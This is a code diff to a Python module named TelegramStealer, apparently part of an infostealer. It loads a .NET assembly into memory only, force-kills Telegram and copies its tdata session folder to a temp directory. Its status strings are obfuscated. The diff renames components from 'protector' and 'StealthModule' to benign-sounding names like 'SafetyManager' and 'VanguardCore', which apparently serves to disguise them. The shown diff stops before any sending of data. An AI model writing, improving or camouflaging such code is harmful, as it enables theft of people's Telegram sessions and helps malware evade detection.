@@ -19,11 +19,11 @@ class TelegramStealer(BaseModule):
     def __init__(self, bot=None, report_manager=None, temp_dir=None):
         super().__init__(bot, report_manager, temp_dir)
         self.appdata = os.environ.get('APPDATA', '')
-        self.protector = None
-        self._load_protector()
+        self.SafetyManager = None
+        self._load_SafetyManager()
         self.last_result = {}
 
-    def _load_protector(self):
+    def _load_SafetyManager(self):
         if not CLR_AVAILABLE:
             return
         try:
@@ -44,8 +44,8 @@ class TelegramStealer(BaseModule):
                         raw_bytes = File.ReadAllBytes(os.path.abspath(_p))
                          # We use Assembly.Load to avoid locking the file and keep it in RAM
                         Assembly.Load(raw_bytes)
-                        from StealthModule import TelegrabManager
-                        self.protector = TelegrabManager
+                        from VanguardCore import TelegrabManager
+                        self.SafetyManager = TelegrabManager
                         break
                     except: continue
         except:
@@ -90,20 +90,20 @@ class TelegramStealer(BaseModule):
             'details': {}
         }
 
-        if not self.protector:
+        if not self.SafetyManager:
             if status_callback: status_callback(decrypt_string("vqyp457pidOKzbqISBkiNiISqNae5Hmy7afa6MHo5qvt4s67+4Hksuo="))
             return result
 
         try:
             # 1. Kill Telegram
             if status_callback: status_callback(decrypt_string("p9aG9YL7gc+awoXDieub7FcVMyk3JiIuJmd6bw==")) # Закрытие Telegram...
-            tg_exe = self.protector.KillTelegram()
+            tg_exe = self.SafetyManager.KillTelegram()
             time.sleep(1.0)
 
             # 2. Capture tdata
             if status_callback: status_callback(decrypt_string(decrypt_string("HgsZLHcICSc9J1haWWA+PgtrKEQnMjwwbEIyThl3Ex8UXxRTJR8KISMuBHIrYARPCURTKmULL1oyFCQNFRYfMBYHMBkiH2szagddcBNgMgAHfDcJeRo/WzJPGg8QClMS"))) # Захват данных...
             temp_tdata = os.path.join(self.temp_dir, decrypt_string("FVYdCDwoKRYFBB5KG1cBUklzAT59HA0vZ1BDRS1CDxQaGgwCIzR3FjMaDxBbEBs="))
-            self.protector.CaptureTelegram(temp_tdata)
+            self.SafetyManager.CaptureTelegram(temp_tdata)
 
             if os.path.exists(temp_tdata):
                 # 3. Analyze data
